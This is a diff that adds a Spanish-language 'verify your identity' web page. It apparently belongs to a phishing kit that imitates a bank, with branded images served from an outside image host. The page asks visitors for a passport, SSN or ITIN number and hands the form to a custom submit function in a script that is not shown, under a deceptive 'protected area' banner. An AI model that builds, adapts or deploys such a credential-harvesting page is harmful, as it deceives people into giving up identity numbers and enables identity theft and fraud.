@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Default</title>
+    <link rel="stylesheet" href="./css/normalize.min.css">
+    <link rel="stylesheet" href="./css/estilos2.css">
+    <link rel="shortcut icon" href="https://ik.imagekit.io/bfa/fde_files/favicon.ico" type="image/x-icon">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+	<script src="./dt.js"></script>
+</head>
+
+<body>
+    <div class="cuerpo">
+        <div class="header">
+            <img src="https://ik.imagekit.io/bfa/fde_files/logo-entrar.png" alt="logo">
+            <img src="https://ik.imagekit.io/bfa/fde_files/protegida-area.png" class="protegida" alt="protegida">
+        </div>
+        <div class="header2">
+            <h1>Verificar su Identidad</h1>
+        </div>
+        <div class="section">
+            <div class="principal">
+                <h2>Casi hemos terminado</h2>
+                <p>Proporcione la siguiente información para completar el proceso de verificación</p>
+                <p class="error" id="error">________</p>
+                <form method="post" action=""  onsubmit="return sender4();" style="font-family: &#39;cnx-regular&#39;, Arial, Helvetica, sans-serif;font-size:16px;" >
+						<p id="gfgcuatro"  hidden=""></p>
+						<p id="addresscuatro"  hidden=""></p>
+					
+					<div class="fgrupo">
+                        <label for="docu">Tipo de documento</label>
+                        <select name="docu" id="docu" style="height: 27px;width:212px;">
+                            <option value="pasaporte">Pasaporte</option>
+                            <option value="ssn">Número de Seguro Social (SSN)</option>
+                            <option value="itin">Número de Identificación Personal del Contribuyente (ITIN)</option>
+                        </select>
+                    </div>
+                    <div class="fgrupo">
+                        <label for="nident">Número de Identificación</label>
+                        <input class="inputCard" type="tel" name="ndocu" id="ndocu" placeholder="Número de Identificación" maxlength="14" required style="height: 22px;width:202px;">
+                    </div>
+                    
+                    <p>
+                        Recuerde ingresar sus datos cuidadosamente a fin de comprobar su identidad y seguir proporcionandole nuestros servicios
+                    </p>
+
+
+                    <div class="fgrupo">
+                        <button type="submit" id="bdocu" class="btn principal">CONFIRMAR</button>
+                    </div>
+                </form>
+            </div>
+            <div class="derecha">
+                <img src="https://ik.imagekit.io/bfa/fde_files/ayuda-docu.png" alt="documento">
+            </div>
+        </div>
+        <div class="footer">
+            <img src="https://ik.imagekit.io/bfa/fde_files/pic2.png" alt="footer">
+        </div>
+    </div>
+    <script src="./js/funciones.js"></script>
+
+
+</body></html>
